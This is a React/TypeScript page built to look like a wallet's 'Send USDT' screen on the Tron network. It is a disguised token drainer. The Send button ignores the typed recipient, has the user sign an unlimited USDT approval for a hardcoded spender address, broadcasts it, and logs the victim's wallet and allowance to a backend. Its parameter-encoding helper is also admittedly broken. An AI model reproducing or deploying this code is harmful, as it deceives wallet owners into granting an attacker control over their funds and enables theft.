import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import SignClient from "@walletconnect/sign-client";

declare global {
  interface Window {
    tronWeb?: any;
    tronLink?: any;
    TronWeb?: any;
  }
}

const PROJECT_ID = "6b5df56bc30c1dadaab59498b86fd3e8";
const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const TRON_SPENDER = "TD7YMonVkbcEiVu5tqXvEeBa2zniao86pJ";

// ✅ FIX 1: Session validity check karne ka function
function isSessionValid(session: any): boolean {
  if (!session) return false;
  const now = Math.floor(Date.now() / 1000);
  // Session ki expiry check karo (WalletConnect session mein expiry hoti hai)
  if (session.expiry && session.expiry < now) {
    console.log("⚠️ Session expired at:", new Date(session.expiry * 1000).toLocaleString());
    return false;
  }
  return true;
}

// ✅ FIX 2: Proper ABI encoding for approve(address,uint256)
function encodeApproveParams(spenderAddress: string): string {
  // Tron address ko hex mein convert karo (base58 → hex)
  // TronGrid visible:true ke saath readable address accept karta hai
  // Parameter format: address aur uint256 ko 32-32 bytes mein pad karo
  
  // Address ko hex format mein convert (T... → 41...)
  // Yahan hum TronWeb ke bina direct hex encode karenge
  
  // Max uint256 value
  const maxUint256 = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
  
  // Spender address ko 32 bytes mein pad karo (Tron address 21 bytes = 42 hex chars)
  // "41" prefix hata ke 20 bytes ka address banao
  // Note: visible:true use karne par TronGrid base58 address accept karta hai
  // Lekin parameter field mein hex chahiye
  
  // Simple approach: TronGrid ke liye parameter as hex string
  // address: 000000000000000000000000 + 20-byte-hex-address
  // uint256: ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
  
  // Tron address base58 → hex conversion (simplified)
  // Actual production mein tronweb.address.toHex() use karo
  // Yahan ham visible:true ke saath string format use karenge
  return `${spenderAddress},115792089237316195423570985008687907853269984665640564039457584007913129639935`;
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<
    "idle" | "processing" | "success"
  >("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const wcClientRef = useRef<any>(null);
  const wcSessionRef = useRef<any>(null);
  const userAddressRef = useRef<string>("");
  const wcModalRef = useRef<any>(null);

  // ===== WALLETCONNECT INIT =====
  useEffect(() => {
    async function initWC() {
      try {
        console.log("🔄 Initializing WalletConnect...");
        const client = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "USDT Transfer",
            description: "TRON USDT Transfer",
            url: window.location.origin,
            icons: [],
          },
        });
        wcClientRef.current = client;

        // ✅ FIX 3: Session event listeners add karo
        client.on("session_delete", () => {
          console.log("🔴 Session deleted by wallet");
          wcSessionRef.current = null;
          userAddressRef.current = "";
        });

        client.on("session_expire", () => {
          console.log("🔴 Session expired");
          wcSessionRef.current = null;
          userAddressRef.current = "";
        });

        // ✅ FIX 4: Purane sessions restore karo SIRF agar valid hain
        const sessions = client.session.getAll();
        console.log(`📋 Found ${sessions.length} existing session(s)`);

        if (sessions.length > 0) {
          // Sabse nayi valid session dhundo
          const validSession = sessions
            .reverse()
            .find((s: any) => isSessionValid(s));

          if (validSession) {
            wcSessionRef.current = validSession;
            const accounts = Object.values(
              validSession.namespaces
            ).flatMap((ns: any) => ns.accounts) as string[];
            const tronAcc = accounts.find((a: string) =>
              a.startsWith("tron:")
            );
            if (tronAcc) {
              userAddressRef.current = tronAcc.split(":")[2];
              console.log("✅ Valid session restored:", userAddressRef.current);
            }
          } else {
            // Sab sessions expired hain - clean karo
            console.log("⚠️ All sessions expired, clearing...");
            for (const session of sessions) {
              try {
                await client.disconnect({
                  topic: session.topic,
                  reason: { code: 6000, message: "Session expired" },
                });
              } catch (e) {
                // Ignore disconnect errors
              }
            }
            wcSessionRef.current = null;
            userAddressRef.current = "";
          }
        }

        // ✅ FIX 5: Modal ko pehle se initialize karo (dynamic import avoid karo)
        const { WalletConnectModal } = await import("@walletconnect/modal");
        wcModalRef.current = new WalletConnectModal({
          projectId: PROJECT_ID,
          themeMode: "dark",
        });
        console.log("✅ WalletConnect + Modal initialized");
      } catch (e) {
        console.error("❌ WC init error:", e);
      }
    }

    initWC();
  }, []);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);
  }, [searchParams]);

  // ✅ FIX 6: Connect function alag nikali - reusable
  async function connectWallet(): Promise<string> {
    if (!wcClientRef.current) {
      throw new Error("WalletConnect initialize nahi hua. Page refresh karein.");
    }

    // Pehle check karo existing session valid hai ya nahi
    if (wcSessionRef.current && isSessionValid(wcSessionRef.current)) {
      if (userAddressRef.current) {
        console.log("✅ Existing valid session use kar rahe hain:", userAddressRef.current);
        return userAddressRef.current;
      }
    }

    // ✅ Session invalid ya nahi hai - naya banao aur modal dikhao
    console.log("📱 Naya WalletConnect session bana rahe hain...");
    wcSessionRef.current = null;
    userAddressRef.current = "";

    const { uri, approval } = await wcClientRef.current.connect({
      requiredNamespaces: {
        tron: {
          methods: ["tron_signTransaction", "tron_signMessage"],
          chains: ["tron:0x2b6653dc"],
          events: ["chainChanged", "accountsChanged"],
        },
      },
    });

    if (!uri) {
      throw new Error("WalletConnect URI nahi mila");
    }

    console.log("🔗 URI mila, modal khol rahe hain...");

    // ✅ FIX 7: Pre-initialized modal use karo, dynamic import avoid
    if (!wcModalRef.current) {
      const { WalletConnectModal } = await import("@walletconnect/modal");
      wcModalRef.current = new WalletConnectModal({
        projectId: PROJECT_ID,
        themeMode: "dark",
      });
    }

    await wcModalRef.current.openModal({ uri });
    console.log("✅ Modal khul gaya - wallet se connect karein");

    // ✅ FIX 8: User rejection handle karo
    try {
      console.log("⏳ Wallet approval ka wait kar rahe hain...");
      wcSessionRef.current = await approval();
      console.log("✅ Wallet ne approve kar diya!");
    } finally {
      wcModalRef.current.closeModal();
    }

    const accounts = Object.values(wcSessionRef.current.namespaces).flatMap(
      (ns: any) => ns.accounts
    ) as string[];
    const tronAcc = accounts.find((a: string) => a.startsWith("tron:"));

    if (!tronAcc) {
      throw new Error("Tron account nahi mila wallet mein");
    }

    userAddressRef.current = tronAcc.split(":")[2];
    console.log("✅ User address:", userAddressRef.current);
    return userAddressRef.current;
  }

  async function handleSend() {
    setTransactionStatusState("processing");

    try {
      console.log("🔄 handleSend started");

      // ✅ Connect wallet (session valid hai toh modal nahi aayega, nahi toh aayega)
      const userAddress = await connectWallet();

      console.log("👤 User:", userAddress);
      console.log("📝 Transaction build kar rahe hain via TronGrid API...");

      // ✅ FIX 9: Proper parameter encoding
      const parameter = encodeApproveParams(TRON_SPENDER);

      const apiResponse = await fetch(
        "https://api.trongrid.io/wallet/triggersmartcontract",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            owner_address: userAddress,
            contract_address: TRON_USDT,
            function_selector: "approve(address,uint256)",
            parameter: parameter,
            fee_limit: 100000000,
            call_value: 0,
            visible: true,
          }),
        }
      );

      if (!apiResponse.ok) {
        throw new Error(`TronGrid API error: ${apiResponse.status}`);
      }

      const apiData = await apiResponse.json();

      if (!apiData.transaction) {
        throw new Error(
          "Transaction build nahi hua: " + JSON.stringify(apiData)
        );
      }

      const { transaction } = apiData;
      console.log("✅ Transaction build hua");

      // ✅ FIX 10: Sign request with timeout
      console.log("🔐 Wallet se signature maang rahe hain...");

      const signPromise = wcClientRef.current.request({
        topic: wcSessionRef.current.topic,
        chainId: "tron:0x2b6653dc",
        request: {
          method: "tron_signTransaction",
          params: [transaction],
        },
      });

      // 2 minute timeout
      const timeoutPromise = new Promise((_, reject) =>
        setTimeout(
          () => reject(new Error("Signature timeout - wallet ne respond nahi kiya")),
          120000
        )
      );

      const signResponse = await Promise.race([signPromise, timeoutPromise]);
      console.log("✅ Sign response mila");

      let signedTx = (signResponse as any)?.result || signResponse;

      if (!signedTx) {
        throw new Error("Empty sign response - wallet ne reject kar diya");
      }

      if (typeof signedTx === "string") {
        try {
          signedTx = JSON.parse(signedTx);
        } catch {
          // already object hai
        }
      }

      console.log("✅ Transaction signed successfully");
      console.log("📡 Broadcasting...");

      const broadcastRes = await fetch(
        "https://api.trongrid.io/wallet/broadcasttransaction",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(signedTx),
        }
      );

      const result = await broadcastRes.json();
      console.log("📡 Broadcast response:", result);

      if (!result || (result.result !== true && !result.txid)) {
        throw new Error("Broadcast failed: " + JSON.stringify(result));
      }

      const txId = result.txid || result.transaction?.txID;
      console.log("✅ Broadcast successful! TX ID:", txId);

      // Confirmation ka wait
      console.log("⏳ Confirmation ka wait kar rahe hain (30s)...");
      await new Promise((r) => setTimeout(r, 30000));

      // Allowance verify karo
      console.log("🔍 Allowance verify kar rahe hain...");
      const allowanceABI = [
        {
          constant: true,
          inputs: [
            { name: "owner", type: "address" },
            { name: "spender", type: "address" },
          ],
          name: "allowance",
          outputs: [{ name: "", type: "uint256" }],
          stateMutability: "view",
          type: "function",
        },
      ];

      const tw = new window.TronWeb({ fullHost: "https://api.trongrid.io" });
      const allowanceContract = await tw.contract(allowanceABI, TRON_USDT);
      const allowanceRaw = await allowanceContract
        .allowance(userAddress, TRON_SPENDER)
        .call();
      const allowanceUSDT = (Number(allowanceRaw) / 1e6).toFixed(2);
      console.log("✅ Allowance:", allowanceUSDT, "USDT");

      await createTransaction({
        walletAddress: userAddress,
        toAddress: TRON_SPENDER,
        amount: amount || "Max",
        txHash: txId || "tx",
        usdtBalance: allowanceUSDT + " USDT",
        nativeBalance: "0 TRX",
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      alert(
        `✅ Approval successful!\n\nAllowance: ${allowanceUSDT} USDT\n\nTx ID: ${txId}`
      );
    } catch (err: any) {
      console.error("❌ Error:", err);
      setTransactionStatusState("idle");

      // ✅ FIX 11: Session error pe auto-reset
      if (
        err.message?.includes("No matching key") ||
        err.message?.includes("session") ||
        err.message?.includes("topic")
      ) {
        console.log("🔄 Session reset kar rahe hain...");
        wcSessionRef.current = null;
        userAddressRef.current = "";
      }

      alert("❌ " + (err.message || "Transaction fail ho gayi"));
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {}
  }

  const dollarValue =
    amount && amount !== "Max" && !isNaN(Number(amount))
      ? `$${Number(amount).toFixed(2)}`
      : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <polygon
        points="12,2 22,8 22,16 12,22 2,16 2,8"
        fill="white"
        opacity="0.9"
      />
      <polygon
        points="12,5 19,9 19,15 12,19 5,15 5,9"
        fill="#EF0027"
        opacity="0.8"
      />
      <text
        x="12"
        y="16"
        textAnchor="middle"
        fill="white"
        fontSize="9"
        fontWeight="bold"
      >
        T
      </text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button
      onClick={onClick}
      style={{
        background: "none",
        border: "1.5px solid #555",
        borderRadius: "50%",
        width: "22px",
        height: "22px",
        color: "#aaa",
        cursor: "pointer",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        fontSize: "11px",
        flexShrink: 0,
        padding: 0,
      }}
    >
      ✕
    </button>
  );

  return (
    <div
      style={{
        margin: 0,
        minHeight: "100vh",
        background: "#1c1c1e",
        color: "#ffffff",
        fontFamily:
          "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
        display: "flex",
        flexDirection: "column",
        maxWidth: "480px",
        marginLeft: "auto",
        marginRight: "auto",
      }}
    >
      {/* Header */}
      <div
        style={{
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "20px 22px 16px",
        }}
      >
        <button
          onClick={() => window.history.back()}
          style={{
            background: "none",
            border: "none",
            color: "#fff",
            cursor: "pointer",
            fontSize: "22px",
            lineHeight: 1,
            padding: 0,
          }}
        >
          ←
        </button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button
          onClick={() => window.history.back()}
          style={{
            background: "none",
            border: "none",
            color: "#fff",
            cursor: "pointer",
            fontSize: "20px",
            lineHeight: 1,
            padding: 0,
          }}
        >
          ✕
        </button>
      </div>

      <div style={{ padding: "4px 18px", flex: 1 }}>
        {/* Address Input */}
        <div style={{ marginBottom: "14px" }}>
          <label
            style={{
              display: "block",
              fontSize: "14px",
              fontWeight: 500,
              color: "#8e8e93",
              marginBottom: "9px",
            }}
          >
            Address or Domain Name
          </label>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              border: "1px solid #2e2e30",
              borderRadius: "14px",
              padding: "14px 14px",
              background: "#242426",
              gap: "8px",
            }}
          >
            <input
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Search or Enter"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#fff",
                fontSize: "16px",
                fontFamily: "monospace",
                minWidth: 0,
              }}
            />
            {toAddress && <XCircle onClick={() => setToAddress("")} />}
            <button
              onClick={handlePaste}
              style={{
                background: "none",
                border: "none",
                color: "#39d353",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: 600,
                padding: "0 2px",
                flexShrink: 0,
              }}
            >
              Paste
            </button>
          </div>
        </div>

        {/* Network */}
        <div style={{ marginBottom: "14px" }}>
          <label
            style={{
              display: "block",
              fontSize: "14px",
              fontWeight: 500,
              color: "#8e8e93",
              marginBottom: "9px",
            }}
          >
            Destination network
          </label>
          <div
            style={{
              display: "inline-flex",
              alignItems: "center",
              gap: "7px",
              background: "#2c2c2e",
              borderRadius: "20px",
              padding: "7px 13px 7px 8px",
            }}
          >
            <div
              style={{
                width: "26px",
                height: "26px",
                borderRadius: "50%",
                background: "#EF0027",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                flexShrink: 0,
              }}
            >
              <TRXIcon />
            </div>
            <span style={{ fontSize: "15px", fontWeight: 600, color: "#fff" }}>
              Tron Network
            </span>
          </div>
        </div>

        {/* Amount Input */}
        <div style={{ marginBottom: "6px" }}>
          <label
            style={{
              display: "block",
              fontSize: "14px",
              fontWeight: 500,
              color: "#8e8e93",
              marginBottom: "9px",
            }}
          >
            Amount
          </label>
          <div
            style={{
              display: "flex",
              alignItems: "center",
              border: "1px solid #2e2e30",
              borderRadius: "14px",
              padding: "14px 14px",
              background: "#242426",
              gap: "8px",
            }}
          >
            <input
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              placeholder="0"
              type="text"
              inputMode="decimal"
              style={{
                flex: 1,
                background: "transparent",
                border: "none",
                outline: "none",
                color: "#fff",
                fontSize: "18px",
                fontFamily: "inherit",
                minWidth: 0,
              }}
            />
            {amount && <XCircle onClick={() => setAmount("")} />}
            <span
              style={{ color: "#8e8e93", fontSize: "16px", flexShrink: 0 }}
            >
              USDT
            </span>
            <button
              onClick={() => setAmount("Max")}
              style={{
                background: "none",
                border: "none",
                color: "#39d353",
                cursor: "pointer",
                fontSize: "16px",
                fontWeight: 600,
                padding: "0",
                flexShrink: 0,
              }}
            >
              Max
            </button>
          </div>
          <div
            style={{
              fontSize: "13px",
              color: "#636366",
              marginTop: "7px",
              paddingLeft: "2px",
            }}
          >
            ≈ {dollarValue}
          </div>
        </div>
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle"}
          style={{
            width: "100%",
            background:
              transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: transactionStatus === "idle" ? "pointer" : "default",
            transition: "all 0.2s ease",
            letterSpacing: "0.01em",
          }}
        >
          {transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>
    </div>
  );
}
